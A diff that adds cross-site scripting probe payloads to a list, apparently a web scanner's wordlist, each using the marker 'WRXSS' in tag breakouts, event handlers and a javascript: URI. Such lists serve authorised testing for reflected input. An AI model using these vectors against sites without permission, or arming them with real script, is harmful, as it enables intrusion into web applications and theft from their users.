@@ -1,5 +1,18 @@
 <WRXSS>
 "><WRXSS>
 '><WRXSS>
+"><WRXSS x=1>
 <img src=x onerror=WRXSS>
+"><img src=x onerror=WRXSS>
+'><img src=x onerror=WRXSS>
+<svg onload=WRXSS>
 "><svg/onload=WRXSS>
+<body onload=WRXSS>
+<WRXSS/onmouseover=1>
+"><WRXSS><script>WRXSS</script>
+</textarea><WRXSS>
+</title><WRXSS>
+"><input onfocus=WRXSS autofocus>
+javascript:WRXSS
+"><details/open/ontoggle=WRXSS>
+<WRXSS onpointerover=1>
